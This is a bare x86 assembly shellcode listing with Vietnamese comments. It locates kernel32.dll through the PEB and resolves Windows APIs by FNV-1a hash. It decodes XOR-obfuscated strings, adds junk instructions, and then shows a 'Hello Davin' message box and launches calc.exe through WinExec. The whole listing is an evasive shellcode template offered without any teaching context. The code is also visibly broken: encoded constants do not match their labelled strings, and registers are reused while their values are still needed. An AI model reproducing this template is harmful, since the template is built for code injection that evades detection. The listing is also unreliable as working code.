section .text
global _start

_start:
    ; Lấy base address kernel32.dll từ PEB
    xor ebx, ebx               ; Xóa ebx
    mov ebx, fs:[ebx + 0x30]   ; ebx = PEB (TEB->PEB tại fs:[0x30])
    mov ebx, [ebx + 0x0C]      ; ebx = PEB->Ldr
    mov ebx, [ebx + 0x14]      ; ebx = InMemoryOrderModuleList
    mov ebx, [ebx]             ; Bỏ qua module đầu (executable)
    mov ebx, [ebx]             ; Bỏ qua module thứ hai (ntdll.dll)
    mov ebx, [ebx + 0x10]      ; ebx = base kernel32.dll
    test ebx, ebx              ; Kiểm tra base hợp lệ
    jz error_exit

    ; Tìm GetProcAddress (hash FNV-1a: 0xF4F0869A)
    mov ebp, ebx               ; Lưu base kernel32.dll
    mov eax, [ebx + 0x3C]      ; eax = offset PE header
    add eax, ebx               ; eax = địa chỉ PE header
    mov eax, [eax + 0x78]      ; eax = offset export table
    add eax, ebx               ; eax = địa chỉ export table
    mov ecx, [eax + 0x18]      ; ecx = NumberOfNames
    test ecx, ecx              ; Kiểm tra NumberOfNames
    jz error_exit
    mov edx, [eax + 0x20]      ; edx = offset AddressOfNames
    add edx, ebx               ; edx = địa chỉ AddressOfNames
find_getproc:
    dec ecx
    js error_exit              ; Thoát nếu hết tên
    mov esi, [edx + ecx * 4]   ; esi = RVA tên hàm
    add esi, ebx               ; esi = địa chỉ tên hàm
    xor edi, edi
    mov edi, 0x811C9DC5        ; FNV-1a initial hash
hash_getproc:
    lodsb                      ; Load byte tên hàm
    test al, al                ; Null terminator?
    jz compare_getproc
    xor edi, eax               ; FNV-1a: XOR với byte
    imul edi, 0x01000193       ; FNV-1a: nhân với prime
    nop                        ; Dummy instruction
    jmp hash_getproc
compare_getproc:
    cmp edi, 0xF4F0869A        ; Hash GetProcAddress
    jne find_getproc
    mov edx, [eax + 0x24]      ; edx = offset AddressOfNameOrdinals
    add edx, ebx
    mov cx, [edx + ecx * 2]    ; cx = ordinal
    mov edx, [eax + 0x1C]      ; edx = offset AddressOfFunctions
    add edx, ebx
    mov esi, [edx + ecx * 4]   ; esi = RVA GetProcAddress
    add esi, ebp               ; esi = địa chỉ GetProcAddress
    test esi, esi
    jz error_exit

    ; Tìm LoadLibraryA (hash FNV-1a: 0xC8DCB3E7)
    mov ecx, [eax + 0x18]      ; Reset ecx = NumberOfNames
    mov edx, [eax + 0x20]      ; edx = AddressOfNames
    add edx, ebp
find_loadlib:
    dec ecx
    js error_exit
    mov ebx, [edx + ecx * 4]   ; ebx = RVA tên hàm
    add ebx, ebp               ; ebx = địa chỉ tên hàm
    xor edi, edi
    mov edi, 0x811C9DC5        ; FNV-1a initial hash
hash_loadlib:
    mov al, [ebx]
    inc ebx
    test al, al
    jz compare_loadlib
    xor edi, eax               ; FNV-1a: XOR với byte
    imul edi, 0x01000193       ; FNV-1a: nhân với prime
    mov eax, eax               ; Dummy instruction
    jmp hash_loadlib
compare_loadlib:
    cmp edi, 0xC8DCB3E7        ; Hash LoadLibraryA
    jne find_loadlib
    mov edx, [eax + 0x24]
    add edx, ebp
    mov cx, [edx + ecx * 2]
    mov edx, [eax + 0x1C]
    add edx, ebp
    mov edi, [edx + ecx * 4]   ; edi = RVA LoadLibraryA
    add edi, ebp               ; edi = địa chỉ LoadLibraryA
    test edi, edi
    jz error_exit

    ; Decode và load user32.dll
    xor ebx, ebx
    push ebx                   ; Null terminator
    push 0x39213939            ; XOR-encoded ".dll"
    push 0x67767677            ; XOR-encoded "er32"
    push 0x222622             ; XOR-encoded "us"
    mov ebx, esp               ; ebx = encoded "user32.dll"
    mov ecx, 12                ; Độ dài chuỗi
decode_user32:
    xor byte [ebx], 0x55       ; Decode với key 0x55
    inc ebx
    loop decode_user32
    mov ebx, esp               ; ebx = "user32.dll"
    and esp, 0xFFFFFFF0        ; Align stack 16-byte
    push ebx
    call edi                   ; Gọi LoadLibraryA
    test eax, eax              ; Kiểm tra lỗi
    jz error_exit
    mov ebx, eax               ; ebx = base user32.dll

    ; Tìm và gọi MessageBoxA (hash FNV-1a: 0xF6A1D11F)
    mov eax, [ebx + 0x3C]      ; eax = offset PE header
    add eax, ebx
    mov eax, [eax + 0x78]      ; eax = offset export table
    add eax, ebx
    mov ecx, [eax + 0x18]      ; ecx = NumberOfNames
    test ecx, ecx
    jz error_exit
    mov edx, [eax + 0x20]
    add edx, ebx
find_msgbox:
    dec ecx
    js error_exit
    mov edi, [edx + ecx * 4]
    add edi, ebx
    xor ebp, ebp
    mov ebp, 0x811C9DC5        ; FNV-1a initial hash
hash_msgbox:
    mov al, [edi]
    inc edi
    test al, al
    jz compare_msgbox
    xor ebp, eax
    imul ebp, 0x01000193
    nop
    jmp hash_msgbox
compare_msgbox:
    cmp ebp, 0xF6A1D11F        ; Hash MessageBoxA
    jne find_msgbox
    mov edx, [eax + 0x24]
    add edx, ebx
    mov cx, [edx + ecx * 2]
    mov edx, [eax + 0x1C]
    add edx, ebx
    mov eax, [edx + ecx * 4]
    add eax, ebx               ; eax = địa chỉ MessageBoxA
    test eax, eax
    jz error_exit
    xor ebx, ebx
    push ebx                   ; MB_OK (0)
    push 0x3A3C3F3A            ; XOR-encoded "ivaD"
    push 0x11                  ; XOR-encoded "D"
    mov edx, esp               ; edx = encoded "Davin"
    mov ecx, 5
decode_davin:
    xor byte [edx], 0x55
    inc edx
    loop decode_davin
    push 0x3D2A2A2A            ; XOR-encoded "ello"
    push 0x1D                  ; XOR-encoded "H"
    mov ecx, esp               ; ecx = encoded "Hello"
    mov edx, 5
decode_hello:
    xor byte [ecx], 0x55
    inc ecx
    loop decode_hello
    and esp, 0xFFFFFFF0        ; Align stack
    push edx                   ; Title
    push ecx                   ; Text
    push ebx                   ; HWND (0)
    call eax                   ; Gọi MessageBoxA

    ; Tìm và gọi WinExec (hash FNV-1a: 0xD6C09F2A)
    mov ebx, [esp + 0x10]      ; Restore base kernel32.dll
    mov eax, [ebx + 0x3C]
    add eax, ebx
    mov eax, [eax + 0x78]
    add eax, ebx
    mov ecx, [eax + 0x18]
    test ecx, ecx
    jz error_exit
    mov edx, [eax + 0x20]
    add edx, ebx
find_winexec:
    dec ecx
    js error_exit
    mov edi, [edx + ecx * 4]
    add edi, ebx
    xor ebp, ebp
    mov ebp, 0x811C9DC5
hash_winexec:
    mov al, [edi]
    inc edi
    test al, al
    jz compare_winexec
    xor ebp, eax
    imul ebp, 0x01000193
    mov eax, eax               ; Dummy instruction
    jmp hash_winexec
compare_winexec:
    cmp ebp, 0xD6C09F2A        ; Hash WinExec
    jne find_winexec
    mov edx, [eax + 0x24]
    add edx, ebx
    mov cx, [edx + ecx * 2]
    mov edx, [eax + 0x1C]
    add edx, ebx
    mov eax, [edx + ecx * 4]
    add eax, ebx               ; eax = địa chỉ WinExec
    test eax, eax
    jz error_exit
    xor ebx, ebx
    push ebx                   ; Null terminator
    push 0x3A3A3A39            ; XOR-encoded ".exe"
    push 0x39213939            ; XOR-encoded "calc"
    mov ebx, esp               ; ebx = encoded "calc.exe"
    mov ecx, 8
decode_calc:
    xor byte [ebx], 0x55
    inc ebx
    loop decode_calc
    and esp, 0xFFFFFFF0        ; Align stack
    push 0x5                   ; SW_SHOW (5)
    push ebx                   ; Cmdline
    call eax                   ; Gọi WinExec

    ; Tìm và gọi ExitProcess (hash FNV-1a: 0x56A2B5F0)
    mov ebx, [esp + 0x10]      ; Restore base kernel32.dll
    mov eax, [ebx + 0x3C]
    add eax, ebx
    mov eax, [eax + 0x78]
    add eax, ebx
    mov ecx, [eax + 0x18]
    test ecx, ecx
    jz error_exit
    mov edx, [eax + 0x20]
    add edx, ebx
find_exitproc:
    dec ecx
    js error_exit
    mov edi, [edx + ecx * 4]
    add edi, ebx
    xor ebp, ebp
    mov ebp, 0x811C9DC5
hash_exitproc:
    mov al, [edi]
    inc edi
    test al, al
    jz compare_exitproc
    xor ebp, eax
    imul ebp, 0x01000193
    nop
    jmp hash_exitproc
compare_exitproc:
    cmp ebp, 0x56A2B5F0        ; Hash ExitProcess
    jne find_exitproc
    mov edx, [eax + 0x24]
    add edx, ebx
    mov cx, [edx + ecx * 2]
    mov edx, [eax + 0x1C]
    add edx, ebx
    mov eax, [edx + ecx * 4]
    add eax, ebx               ; eax = địa chỉ ExitProcess
    test eax, eax
    jz error_exit
    xor ebx, ebx
    push ebx                   ; Exit code 0
    call eax                   ; Gọi ExitProcess

error_exit:
    mov ebx, [esp + 0x10]      ; Restore base kernel32.dll
    mov eax, [ebx + 0x3C]
    add eax, ebx
    mov eax, [eax + 0x78]
    add eax, ebx
    mov ecx, [eax + 0x18]
    mov edx, [eax + 0x20]
    add edx, ebx
find_exitproc_err:
    dec ecx
    js hang                    ; Nếu không tìm thấy, treo
    mov edi, [edx + ecx * 4]
    add edi, ebx
    xor ebp, ebp
    mov ebp, 0x811C9DC5
hash_exitproc_err:
    mov al, [edi]
    inc edi
    test al, al
    jz compare_exitproc_err
    xor ebp, eax
    imul ebp, 0x01000193
    jmp hash_exitproc_err
compare_exitproc_err:
    cmp ebp, 0x56A2B5F0        ; Hash ExitProcess
    jne find_exitproc_err
    mov edx, [eax + 0x24]
    add edx, ebx
    mov cx, [edx + ecx * 2]
    mov edx, [eax + 0x1C]
    add edx, ebx
    mov eax, [edx + ecx * 4]
    add eax, ebx
    push 1                     ; Exit code 1
    call eax                   ; Gọi ExitProcess

hang:
    jmp hang                   ; Vòng lặp vô hạn nếu lỗi nghiêm trọng
